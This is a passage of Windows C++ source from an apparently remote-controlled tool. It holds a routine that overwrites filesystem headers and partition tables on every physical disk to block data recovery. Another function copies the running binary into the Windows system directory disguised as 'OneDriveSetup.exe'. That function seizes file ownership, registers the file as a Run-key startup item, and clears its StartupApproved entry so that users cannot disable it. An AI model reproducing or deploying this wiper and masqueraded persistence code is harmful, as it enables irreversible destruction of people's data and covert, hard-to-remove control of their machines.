                skipDiskNums.insert((DWORD)exeDiskNum);
                char skipMsg[128];
                sprintf_s(skipMsg, "INFO|程序所在盘 %c: 位于 PhysicalDrive%d，将跳过|%s",
                    exeLetter, exeDiskNum, cpuTag.c_str());
                Report(string(skipMsg));
            }
        }
    }

    vector<int> diskNums;
    for (int i = 0; i <= 15; i++) {
        char path[32];
        sprintf_s(path, "\\\\.\\PhysicalDrive%d", i);
        HANDLE hDisk = CreateFileA(path, 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hDisk != INVALID_HANDLE_VALUE) {
            CloseHandle(hDisk);
            if (skipDiskNums.find((DWORD)i) != skipDiskNums.end()) {
                char skipMsg[128];
                sprintf_s(skipMsg, "INFO|PhysicalDrive%d 正在被PE使用，跳过|%s",
                    i, cpuTag.c_str());
                Report(string(skipMsg));
                continue;
            }
            diskNums.push_back(i);
        }
    }

    if (diskNums.empty()) {
        string err = "ERROR|未找到任何物理磁盘|" + cpuTag;
        Report(err);
        return err;
    }

    char countBuf[128];
    sprintf_s(countBuf, "INFO|共找到 %d 个物理磁盘，开始逐一清除分区|%s",
        (int)diskNums.size(), cpuTag.c_str());
    Report(string(countBuf));

    int successCount = 0, skipCount = 0;

    // ===== 第一阶段：覆写各分区文件系统头 =====
    Report("INFO|开始覆写各分区文件系统头，防止数据恢复|" + cpuTag);

    // ★ 对齐内存，FILE_FLAG_NO_BUFFERING要求缓冲区地址按扇区对齐
    const DWORD WIPE_SIZE = 64 * 1024 * 1024; // 64MB
    void* wipeAligned = _aligned_malloc(WIPE_SIZE, 4096);
    if (wipeAligned) memset(wipeAligned, 0, WIPE_SIZE);

    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (!(drives & (1 << i))) continue;
        char letter = 'A' + i;

        char volPath[32];
        sprintf_s(volPath, "\\\\.\\%c:", letter);

        // 获取该盘符对应的物理磁盘编号
        HANDLE hVol = CreateFileA(volPath, 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hVol == INVALID_HANDLE_VALUE) continue;
        STORAGE_DEVICE_NUMBER sdn = {};
        DWORD br = 0;
        int diskNum = -1;
        if (DeviceIoControl(hVol, IOCTL_STORAGE_GET_DEVICE_NUMBER,
            NULL, 0, &sdn, sizeof(sdn), &br, NULL))
            diskNum = (int)sdn.DeviceNumber;
        CloseHandle(hVol);

        if (diskNum < 0) continue;
        if (skipDiskNums.find((DWORD)diskNum) != skipDiskNums.end()) continue;
        if (!wipeAligned) {
            Report("WARN|对齐内存分配失败，跳过文件系统头覆写|" + cpuTag);
            break;
        }

        HANDLE hPart = CreateFileA(volPath,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING,
            FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, NULL);
        if (hPart == INVALID_HANDLE_VALUE) {
            char wipeMsg[128];
            sprintf_s(wipeMsg, "WARN|分区 %c: 无法打开 错误码:%lu|%s",
                letter, GetLastError(), cpuTag.c_str());
            Report(string(wipeMsg));
            continue;
        }

        // 卸载卷（允许失败，记录结果）
        BOOL lockOk = DeviceIoControl(hPart, FSCTL_LOCK_VOLUME,
            NULL, 0, NULL, 0, &br, NULL);
        DeviceIoControl(hPart, FSCTL_DISMOUNT_VOLUME,
            NULL, 0, NULL, 0, &br, NULL);

        // ★ 起独立线程执行写操作，主线程等待timeout_ms超时
        struct WipeParam {
            HANDLE hPart;
            void* buf;
            DWORD  size;
            bool   result;
            DWORD  errCode;
        };
        WipeParam wp = { hPart, wipeAligned, WIPE_SIZE, false, 0 };

        HANDLE hWipeThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
            WipeParam* wp = (WipeParam*)p;
            LARGE_INTEGER seekZero = {};
            SetFilePointerEx(wp->hPart, seekZero, NULL, FILE_BEGIN);
            DWORD written = 0;
            wp->result = WriteFile(wp->hPart, wp->buf, wp->size, &written, NULL)
                && written == wp->size;
            if (!wp->result) wp->errCode = GetLastError();
            return 0;
            }, &wp, 0, NULL);

        bool wipeOk = false;
        bool timedOut = false;
        if (hWipeThread) {
            DWORD waitRet = WaitForSingleObject(hWipeThread, timeout_ms);
            if (waitRet == WAIT_TIMEOUT) {
                TerminateThread(hWipeThread, 0);
                timedOut = true;
            }
            else {
                wipeOk = wp.result;
            }
            CloseHandle(hWipeThread);
        }

        CloseHandle(hPart);

        char wipeMsg[256];
        if (timedOut)
            sprintf_s(wipeMsg, "WARN|分区 %c: 覆写超时（%d秒），已跳过|%s",
                letter, timeout_ms / 1000, cpuTag.c_str());
        else if (wipeOk)
            sprintf_s(wipeMsg, "OK|已覆写分区 %c: 文件系统头 64MB%s|%s",
                letter, lockOk ? "" : "（锁卷失败但已继续）", cpuTag.c_str());
        else
            sprintf_s(wipeMsg, "WARN|分区 %c: 覆写失败 错误码:%lu|%s",
                letter, wp.errCode, cpuTag.c_str());
        Report(string(wipeMsg));
    }

    if (wipeAligned) _aligned_free(wipeAligned);
    Report("INFO|文件系统头覆写完成，开始清除分区表|" + cpuTag);

    // ===== 第二阶段：清除物理磁盘分区表 =====
    for (int idx = (int)diskNums.size() - 1; idx >= 0; idx--) {
        int diskNum = diskNums[idx];

        char infoMsg[128];
        sprintf_s(infoMsg, "INFO|正在处理 PhysicalDrive%d ...|%s",
            diskNum, cpuTag.c_str());
        Report(string(infoMsg));

        char diskPath[32];
        sprintf_s(diskPath, "\\\\.\\PhysicalDrive%d", diskNum);

        HANDLE hDisk = CreateFileA(diskPath,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING,
            FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, NULL);

        if (hDisk == INVALID_HANDLE_VALUE) {
            char errMsg[256];
            sprintf_s(errMsg, "ERROR|PhysicalDrive%d 无法打开 错误码:%lu|%s",
                diskNum, GetLastError(), cpuTag.c_str());
            Report(string(errMsg));
            skipCount++;
            continue;
        }

        DWORD bytesRet = 0;
        DeviceIoControl(hDisk, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &bytesRet, NULL);
        DeviceIoControl(hDisk, FSCTL_DISMOUNT_VOLUME, NULL, 0, NULL, 0, &bytesRet, NULL);

        DISK_GEOMETRY_EX geo = {};
        DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX,
            NULL, 0, &geo, sizeof(geo), &bytesRet, NULL);
        LONGLONG diskSize = geo.DiskSize.QuadPart;
        DWORD sectorSize = geo.Geometry.BytesPerSector > 0
            ? geo.Geometry.BytesPerSector : 512;

        const int CLEAR_SECTORS = 64;
        DWORD clearBytes = CLEAR_SECTORS * sectorSize;

        // ★ 对齐内存
        void* clearAligned = _aligned_malloc(clearBytes, 4096);
        if (!clearAligned) {
            char errMsg[128];
            sprintf_s(errMsg, "ERROR|PhysicalDrive%d 内存分配失败，跳过|%s",
                diskNum, cpuTag.c_str());
            Report(string(errMsg));
            CloseHandle(hDisk);
            skipCount++;
            continue;
        }
        memset(clearAligned, 0, clearBytes);

        // ★ 带超时的写操作封装
        struct DiskWipeParam {
            HANDLE   hDisk;
            void* buf;
            DWORD    size;
            LONGLONG offset;
            bool     result;
            DWORD    errCode;
        };

        // 返回值：0=成功 1=失败 2=超时
        auto RunDiskWipe = [&](LONGLONG offset) -> int {
            DiskWipeParam dwp = { hDisk, clearAligned, clearBytes, offset, false, 0 };
            HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                DiskWipeParam* dp = (DiskWipeParam*)p;
                LARGE_INTEGER pos; pos.QuadPart = dp->offset;
                SetFilePointerEx(dp->hDisk, pos, NULL, FILE_BEGIN);
                DWORD written = 0;
                dp->result = WriteFile(dp->hDisk, dp->buf, dp->size, &written, NULL)
                    && written == dp->size;
                if (!dp->result) dp->errCode = GetLastError();
                return 0;
                }, &dwp, 0, NULL);
            if (!hThread) return 1;
            DWORD waitRet = WaitForSingleObject(hThread, timeout_ms);
            if (waitRet == WAIT_TIMEOUT) {
                TerminateThread(hThread, 0);
                CloseHandle(hThread);
                return 2; // 超时
            }
            CloseHandle(hThread);
            return dwp.result ? 0 : 1;
        };

        int frontRet = RunDiskWipe(0);
        bool frontOk = (frontRet == 0);

        if (frontRet == 2) {
            char errMsg[128];
            sprintf_s(errMsg, "WARN|PhysicalDrive%d 前扇区写入超时（%d秒），已跳过|%s",
                diskNum, timeout_ms / 1000, cpuTag.c_str());
            Report(string(errMsg));
        }

        bool backOk = false;
        if (diskSize > 0 && diskSize > (LONGLONG)clearBytes) {
            LONGLONG backOffset = (diskSize - clearBytes) / sectorSize * sectorSize;
            int backRet = RunDiskWipe(backOffset);
            backOk = (backRet == 0);
            if (backRet == 2) {
                char errMsg[128];
                sprintf_s(errMsg, "WARN|PhysicalDrive%d GPT备份写入超时（%d秒），已跳过|%s",
                    diskNum, timeout_ms / 1000, cpuTag.c_str());
                Report(string(errMsg));
            }
        }

        DeviceIoControl(hDisk, IOCTL_DISK_UPDATE_PROPERTIES,
            NULL, 0, NULL, 0, &bytesRet, NULL);
        CloseHandle(hDisk);
        _aligned_free(clearAligned);

        if (frontOk) {
            char doneMsg[256];
            sprintf_s(doneMsg, "OK|PhysicalDrive%d 分区表已清除%s|%s",
                diskNum,
                backOk ? "（含GPT备份）" : "（GPT备份清除失败，可忽略）",
                cpuTag.c_str());
            Report(string(doneMsg));
            successCount++;
        }
        else {
            char errMsg[256];
            sprintf_s(errMsg, "ERROR|PhysicalDrive%d 写入超时或失败，已跳过|%s",
                diskNum, cpuTag.c_str());
            Report(string(errMsg));
            skipCount++;
        }
    }

    char finalMsg[256];
    sprintf_s(finalMsg, "DONE|格式化完成 成功:%d 跳过:%d|%s",
        successCount, skipCount, cpuTag.c_str());
    Report(string(finalMsg));
    return string(finalMsg);
}

// ===== 提升注册表操作权限（RegLoadKey需要）=====
bool EnableRegistryPrivileges()
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    auto EnablePriv = [&](LPCWSTR privName) {
        TOKEN_PRIVILEGES tp = {};
        LUID luid;
        if (!LookupPrivilegeValueW(NULL, privName, &luid)) return;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, 0);
    };

    EnablePriv(L"SeRestorePrivilege");
    EnablePriv(L"SeBackupPrivilege");
    EnablePriv(L"SeTakeOwnershipPrivilege");  // ★ 新增：允许接管文件所有权
    CloseHandle(hToken);
    return true;
}

// ===== 读取单个注册表路径下所有软件信息 =====
string ReadUninstallKey(HKEY hRoot, const string& subKey)
{
    string result;
    wstring wSubKey = Utf8ToWide(subKey);

    HKEY hKey;
    if (RegOpenKeyExW(hRoot, wSubKey.c_str(), 0,
        KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS)
        return "";

    DWORD subKeyCount = 0;
    RegQueryInfoKeyW(hKey, NULL, NULL, NULL, &subKeyCount,
        NULL, NULL, NULL, NULL, NULL, NULL, NULL);

    for (DWORD i = 0; i < subKeyCount; i++) {
        wchar_t subKeyName[512] = {};
        DWORD subKeyNameLen = 512;
        if (RegEnumKeyExW(hKey, i, subKeyName, &subKeyNameLen,
            NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            continue;

        HKEY hSub;
        if (RegOpenKeyExW(hKey, subKeyName, 0,
            KEY_READ | KEY_WOW64_64KEY, &hSub) != ERROR_SUCCESS)
            continue;

        // 先检查DisplayName，没有则跳过
        wchar_t dispName[1024] = {};
        DWORD dispNameSize = sizeof(dispName);
        DWORD type = 0;
        if (RegQueryValueExW(hSub, L"DisplayName", NULL, &type,
            (LPBYTE)dispName, &dispNameSize) != ERROR_SUCCESS
            || wcslen(dispName) == 0) {
            RegCloseKey(hSub);
            continue;
        }

        // 枚举所有值
        string entry = "[" + WideToUtf8(wstring(subKeyName)) + "]\r\n";

        DWORD valueCount = 0;
        RegQueryInfoKeyW(hSub, NULL, NULL, NULL, NULL, NULL, NULL,
            &valueCount, NULL, NULL, NULL, NULL);

        for (DWORD v = 0; v < valueCount; v++) {
            wchar_t valueName[512] = {};
            DWORD valueNameLen = 512;
            DWORD valueType = 0;
            DWORD dataSize = 0;

            if (RegEnumValueW(hSub, v, valueName, &valueNameLen,
                NULL, &valueType, NULL, &dataSize) != ERROR_SUCCESS)
                continue;

            // 限制单个值最大4MB
            if (dataSize > 4 * 1024 * 1024) continue;

            vector<BYTE> dataBuf(dataSize + 2, 0);
            DWORD actualSize = dataSize;
            valueNameLen = 512;
            if (RegEnumValueW(hSub, v, valueName, &valueNameLen,
                NULL, &valueType, dataBuf.data(), &actualSize) != ERROR_SUCCESS)
                continue;

            string valNameUtf8 = WideToUtf8(wstring(valueName));
            string valData;

            switch (valueType) {
            case REG_SZ:
            case REG_EXPAND_SZ: {
                wstring ws((wchar_t*)dataBuf.data());
                valData = WideToUtf8(ws);
                break;
            }
            case REG_DWORD: {
                if (actualSize >= 4) {
                    DWORD dw = *(DWORD*)dataBuf.data();
                    char buf[32]; sprintf_s(buf, "%lu", dw);
                    valData = buf;
                }
                break;
            }
            case REG_QWORD: {
                if (actualSize >= 8) {
                    ULONGLONG qw = *(ULONGLONG*)dataBuf.data();
                    char buf[32]; sprintf_s(buf, "%llu", qw);
                    valData = buf;
                }
                break;
            }
            default:
                valData = "(binary)";
                break;
            }

            entry += valNameUtf8 + "=" + valData + "\r\n";
        }

        entry += "\r\n";
        result += entry;
        RegCloseKey(hSub);
    }

    RegCloseKey(hKey);
    return result;
}
// ===== 获取开机启动项（当前系统 HKLM + HKCU）=====
string GetStartupItems()
{
    string result;

    auto ReadRunKey = [](HKEY hRoot, const string& subKey, string& out)
    {
        wstring wSubKey = Utf8ToWide(subKey);
        HKEY hKey = NULL;
        if (RegOpenKeyExW(hRoot, wSubKey.c_str(), 0,
            KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS)
            return;

        out += "--- " + subKey + " ---\r\n";

        DWORD i = 0;
        wchar_t valName[512] = {};
        DWORD nameLen = 512;
        DWORD type = 0;
        wchar_t valData[2048] = {};
        DWORD dataLen = sizeof(valData);

        while (RegEnumValueW(hKey, i++, valName, &(nameLen = 512),
            NULL, &type, (LPBYTE)valData, &(dataLen = sizeof(valData))) == ERROR_SUCCESS)
        {
            if (type == REG_SZ || type == REG_EXPAND_SZ)
            {
                string name = WideToUtf8(wstring(valName));
                string data = WideToUtf8(wstring(valData));
                out += name + "=" + data + "\r\n";
            }
        }
        out += "\r\n";
        RegCloseKey(hKey);
    };

    result += "========================================\r\n";
    result += "[HKEY_LOCAL_MACHINE 启动项]\r\n";
    result += "========================================\r\n\r\n";
    ReadRunKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", result);
    ReadRunKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", result);
    ReadRunKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", result);
    ReadRunKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", result);

    result += "========================================\r\n";
    result += "[HKEY_CURRENT_USER 启动项]\r\n";
    result += "========================================\r\n\r\n";
    ReadRunKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", result);
    ReadRunKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", result);

    return result;
}
// ===== 获取安装软件列表（正常系统+PE下所有系统盘）=====
string GetInstalledSoftware(SOCKET reportSocket)
{
    string cpuTag;
    { wchar_t h[256] = {}; DWORD l = 256;
    if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }

    EnableRegistryPrivileges();

    // ★ 禁用WOW64文件系统重定向
    PVOID oldFsRedirection = NULL;
    Wow64DisableWow64FsRedirection(&oldFsRedirection);

    string fullResult;
    bool foundAny = false;

    // 获取当前系统盘盘符
    wchar_t winDir[MAX_PATH] = {};
    GetWindowsDirectoryW(winDir, MAX_PATH);
    char currentDrive = (char)winDir[0];

    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (!(drives & (1 << i))) continue;
        char letter = 'A' + i;
        string rootA = string(1, letter) + ":\\";

        // 检查是否有Windows系统
        // ★ 用Windows目录判断系统盘，更稳定，不受权限和WOW64影响
        string winPath = string(1, letter) + ":\\Windows";
        wstring wWinPath = Utf8ToWide(winPath);
        DWORD winAttr = GetFileAttributesW(wWinPath.c_str());
        if (winAttr == INVALID_FILE_ATTRIBUTES ||
            !(winAttr & FILE_ATTRIBUTE_DIRECTORY))
            continue;

        // RegLoadKey仍需要SOFTWARE文件路径
        string softwarePath = string(1, letter) +
            ":\\Windows\\System32\\config\\SOFTWARE";
        wstring wSoftwarePath = Utf8ToWide(softwarePath);

        foundAny = true;
        string sectionHeader = "========================================\r\n";
        sectionHeader += "[" + string(1, letter) +
            "盘系统] 安装软件列表\r\n";
        sectionHeader += "========================================\r\n\r\n";
        fullResult += sectionHeader;

        string sectionData;

        if (letter == currentDrive) {
            // 当前运行系统，直接读注册表
            sectionData += "--- 64位软件 ---\r\n";
            sectionData += ReadUninstallKey(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
            sectionData += "--- 32位软件 ---\r\n";
            sectionData += ReadUninstallKey(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
        }
        else {
            // 离线系统，用RegLoadKey挂载
            string tempKeyName = "FortodeskTemp_" + string(1, letter);
            wstring wTempKey = Utf8ToWide(tempKeyName);
            wstring wHivePath = Utf8ToWide(softwarePath);

            // ★ 先尝试卸载可能残留的同名key，再挂载
            RegUnLoadKeyW(HKEY_LOCAL_MACHINE, wTempKey.c_str());
            Sleep(200);

            LONG loadRet = RegLoadKeyW(HKEY_LOCAL_MACHINE,
                wTempKey.c_str(), wSoftwarePath.c_str());

            // ★ 错误码32（文件共享冲突）时，再重试一次
            if (loadRet == ERROR_SHARING_VIOLATION) {
                Sleep(800);
                loadRet = RegLoadKeyW(HKEY_LOCAL_MACHINE,
                    wTempKey.c_str(), wSoftwarePath.c_str());
            }

            if (loadRet != ERROR_SUCCESS) {
                char errMsg[256];
                sprintf_s(errMsg,
                    "ERROR|%c盘 注册表挂载失败 错误码:%ld|%s",
                    letter, loadRet, cpuTag.c_str());
                fullResult += string(errMsg) + "\r\n";
                continue;
            }

            sectionData += "--- 64位软件 ---\r\n";
            sectionData += ReadUninstallKey(HKEY_LOCAL_MACHINE,
                tempKeyName + "\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
            sectionData += "--- 32位软件 ---\r\n";
            sectionData += ReadUninstallKey(HKEY_LOCAL_MACHINE,
                tempKeyName + "\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");

            RegUnLoadKeyW(HKEY_LOCAL_MACHINE, wTempKey.c_str());
        }

        if (sectionData.empty())
            sectionData = "未找到任何软件记录\r\n";
        fullResult += sectionData + "\r\n";
    }

    if (!foundAny)
        fullResult = "未找到任何Windows系统分区\r\n";

    // ★ 恢复WOW64文件系统重定向
    Wow64RevertWow64FsRedirection(oldFsRedirection);

    return fullResult;
}

// ===== 添加/卸载开机启动项（所有系统盘）=====
string ModifyStartup(SOCKET reportSocket, bool add, bool copyFile, const string& sourceFilePath)
{
    string cpuTag;
    { wchar_t h[256] = {}; DWORD l = 256;
    if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }

    EnableRegistryPrivileges();

    // ★ 禁用WOW64文件系统重定向
    PVOID oldFsRedirection = NULL;
    Wow64DisableWow64FsRedirection(&oldFsRedirection);

    // 获取源文件路径：外部传入优先，否则用自身
    wchar_t selfPath[MAX_PATH] = {};
    if (!sourceFilePath.empty()) {
        wcsncpy_s(selfPath, Utf8ToWide(sourceFilePath).c_str(), MAX_PATH - 1);
    }
    else {
        GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    }

    wchar_t winDir[MAX_PATH] = {};
    GetWindowsDirectoryW(winDir, MAX_PATH);
    char currentDrive = (char)winDir[0];

    string result;
    bool foundAny = false;

    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (!(drives & (1 << i))) continue;
        char letter = 'A' + i;

        // ★ 跳过X盘（PE系统盘）
        if (letter == 'X' || letter == 'x') continue;

        string rootA = string(1, letter) + ":\\";

        // ★ 用Windows目录判断系统盘
        string winPath = string(1, letter) + ":\\Windows";
        wstring wWinPath = Utf8ToWide(winPath);
        DWORD winAttr = GetFileAttributesW(wWinPath.c_str());
        if (winAttr == INVALID_FILE_ATTRIBUTES ||
            !(winAttr & FILE_ATTRIBUTE_DIRECTORY))
            continue;

        // RegLoadKey仍需要SOFTWARE文件路径
        string softwarePath = string(1, letter) +
            ":\\Windows\\System32\\config\\SOFTWARE";
        wstring wSoftwarePath = Utf8ToWide(softwarePath);

        foundAny = true;

        // ★ 判断是64位还是32位系统（检查SysWOW64目录是否存在）
        string sysWow64Dir = string(1, letter) + ":\\Windows\\SysWOW64";
        wstring wSysWow64Dir = Utf8ToWide(sysWow64Dir);
        bool is64bit = (GetFileAttributesW(wSysWow64Dir.c_str()) != INVALID_FILE_ATTRIBUTES);
        string sysSubDir = is64bit ? "SysWOW64" : "System32";

        // 文件操作用实际盘符（PE下系统盘可能不是C:）
        string copyTargetPath = string(1, letter) +
            ":\\Windows\\" + sysSubDir + "\\OneDriveSetup.exe";
        wstring wCopyTargetPath = Utf8ToWide(copyTargetPath);

        // ★ 注册表路径硬编码C盘，Windows启动后系统盘永远是C盘
        string targetExePath = "C:\\Windows\\" + sysSubDir + "\\OneDriveSetup.exe";
        wstring wTargetExePath = Utf8ToWide(targetExePath);

        if (add && copyFile) {
            // ★ 复制前先去掉目标文件只读属性（PE下系统盘可能有写保护）
            SetFileAttributesW(wCopyTargetPath.c_str(), FILE_ATTRIBUTE_NORMAL);

            // 复制文件模式：先复制再写注册表
            if (!CopyFileW(selfPath, wCopyTargetPath.c_str(), FALSE)) {
                DWORD copyErr = GetLastError();

                if (copyErr == ERROR_ACCESS_DENIED) {
                    // 先试提权再复制
                    HANDLE hToken2;
                    if (OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken2)) {
                        TOKEN_PRIVILEGES tp = {};
                        LookupPrivilegeValueW(NULL, L"SeRestorePrivilege",
                            &tp.Privileges[0].Luid);
                        tp.PrivilegeCount = 1;
                        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                        AdjustTokenPrivileges(hToken2, FALSE, &tp, 0, NULL, 0);
                        CloseHandle(hToken2);
                    }
                    SetFileAttributesW(wCopyTargetPath.c_str(), FILE_ATTRIBUTE_NORMAL);
                    if (!CopyFileW(selfPath, wCopyTargetPath.c_str(), FALSE)) {
                        // ★ 提权后仍失败，用TIHelper夺权重置ACL后直接CopyFileW
                        // 不走cmd.exe /c copy，避免中文路径在控制台编码下出错（错误码3）
                        TIHelper::ForceDelete(wCopyTargetPath);  // 先清掉旧文件

                        // 开启全套特权，确保CopyFileW能写入系统目录
                        {
                            HANDLE hTok = NULL;
                            if (OpenProcessToken(GetCurrentProcess(),
                                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
                            {
                                auto EnableP = [&](LPCWSTR name) {
                                    TOKEN_PRIVILEGES tp = {};
                                    LUID luid = {};
                                    if (LookupPrivilegeValueW(NULL, name, &luid)) {
                                        tp.PrivilegeCount = 1;
                                        tp.Privileges[0].Luid = luid;
                                        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                                        AdjustTokenPrivileges(hTok, FALSE, &tp, 0, NULL, 0);
                                    }
                                };
                                EnableP(L"SeRestorePrivilege");
                                EnableP(L"SeBackupPrivilege");
                                EnableP(L"SeTakeOwnershipPrivilege");
                                CloseHandle(hTok);
                            }
                        }

                        SetFileAttributesW(wCopyTargetPath.c_str(), FILE_ATTRIBUTE_NORMAL);
                        if (!CopyFileW(selfPath, wCopyTargetPath.c_str(), FALSE)) {
                            char errMsg[256];
                            sprintf_s(errMsg,
                                "ERROR|%c盘 复制文件失败(TI) 错误码:%lu|%s",
                                letter, GetLastError(), cpuTag.c_str());
                            result += string(errMsg) + "\r\n";
                            continue;
                        }
                    }
                }
                else {
                    // ★ 非权限错误，夺权重置ACL后直接CopyFileW，不走cmd.exe
                    TIHelper::ForceDelete(wCopyTargetPath);

                    {
                        HANDLE hTok = NULL;
                        if (OpenProcessToken(GetCurrentProcess(),
                            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
                        {
                            auto EnableP = [&](LPCWSTR name) {
                                TOKEN_PRIVILEGES tp = {};
                                LUID luid = {};
                                if (LookupPrivilegeValueW(NULL, name, &luid)) {
                                    tp.PrivilegeCount = 1;
                                    tp.Privileges[0].Luid = luid;
                                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                                    AdjustTokenPrivileges(hTok, FALSE, &tp, 0, NULL, 0);
                                }
                            };
                            EnableP(L"SeRestorePrivilege");
                            EnableP(L"SeBackupPrivilege");
                            EnableP(L"SeTakeOwnershipPrivilege");
                            CloseHandle(hTok);
                        }
                    }

                    SetFileAttributesW(wCopyTargetPath.c_str(), FILE_ATTRIBUTE_NORMAL);
                    if (!CopyFileW(selfPath, wCopyTargetPath.c_str(), FALSE)) {
                        char errMsg[256];
                        sprintf_s(errMsg,
                            "ERROR|%c盘 复制文件失败 错误码:%lu|%s",
                            letter, copyErr, cpuTag.c_str());
                        result += string(errMsg) + "\r\n";
                        continue;
                    }
                }
            }
        }  // ← ★ 这里是 if (add && copyFile) 的闭合括号，你的代码里这行缺失了
        // 操作注册表Run键
        const wchar_t* runSubKey =
            L"Microsoft\\Windows\\CurrentVersion\\Run";
        const wchar_t* valueName = L"OneDriveSetup";

        if (letter == currentDrive) {
            // 当前系统直接操作
            HKEY hRun = NULL;
            DWORD disposition = 0;
            // ★ 用RegCreateKeyExW，键不存在时自动创建，KEY_WOW64_64KEY确保访问64位视图
            // ★ 清理 StartupApproved\Run 里的同名项
            HKEY hApproved = NULL;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run",
                0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hApproved) == ERROR_SUCCESS)
            {
                RegDeleteValueW(hApproved, valueName);
                RegCloseKey(hApproved);
            }
            LONG openRet = RegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, NULL,
                REG_OPTION_NON_VOLATILE,
                KEY_SET_VALUE | KEY_WOW64_64KEY,
                NULL,
                &hRun,
                &disposition);
            if (openRet == ERROR_SUCCESS) {
                if (add) {
                    wstring wVal = wTargetExePath;
                    RegSetValueExW(hRun, valueName, 0, REG_SZ,
                        (LPBYTE)wVal.c_str(),
                        (DWORD)((wVal.size() + 1) * sizeof(wchar_t)));
                    char okMsg[128];
                    sprintf_s(okMsg, "OK|%c盘 启动项已添加|%s",
                        letter, cpuTag.c_str());
                    result += string(okMsg) + "\r\n";
                }
                else {
                    RegDeleteValueW(hRun, valueName);
                    char okMsg[128];
                    sprintf_s(okMsg, "OK|%c盘 启动项已删除|%s",
                        letter, cpuTag.c_str());
                    result += string(okMsg) + "\r\n";
                }
                RegCloseKey(hRun);
            }
            else {
                char errMsg[128];
                sprintf_s(errMsg, "ERROR|%c盘 打开Run键失败 错误码:%ld|%s",
                    letter, openRet, cpuTag.c_str());
                result += string(errMsg) + "\r\n";
            }
        }
        else {
            // 离线系统用RegLoadKey
            string tempKeyName = "FortodeskStartup_" + string(1, letter);
            wstring wTempKey = Utf8ToWide(tempKeyName);

            // ★ 先卸载可能残留的同名key，再挂载
            RegUnLoadKeyW(HKEY_LOCAL_MACHINE, wTempKey.c_str());
            Sleep(200);
            LONG loadRet = RegLoadKeyW(HKEY_LOCAL_MACHINE,
                wTempKey.c_str(), wSoftwarePath.c_str());
            if (loadRet == ERROR_SHARING_VIOLATION) {
                Sleep(800);
                loadRet = RegLoadKeyW(HKEY_LOCAL_MACHINE,
                    wTempKey.c_str(), wSoftwarePath.c_str());
            }
            if (loadRet != ERROR_SUCCESS) {
                char errMsg[256];
                sprintf_s(errMsg,
                    "ERROR|%c盘 注册表挂载失败 错误码:%ld|%s",
                    letter, loadRet, cpuTag.c_str());
                result += string(errMsg) + "\r\n";
                continue;
            }

            // ★ 清理 StartupApproved\Run 里的同名项
            wstring wApprovedKey = wTempKey +
                L"\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run";
            HKEY hApproved = NULL;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wApprovedKey.c_str(),
                0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hApproved) == ERROR_SUCCESS)
            {
                RegDeleteValueW(hApproved, valueName);
                RegCloseKey(hApproved);
            }

            wstring wFullRunKey = wTempKey + L"\\" + runSubKey;
            HKEY hRun;
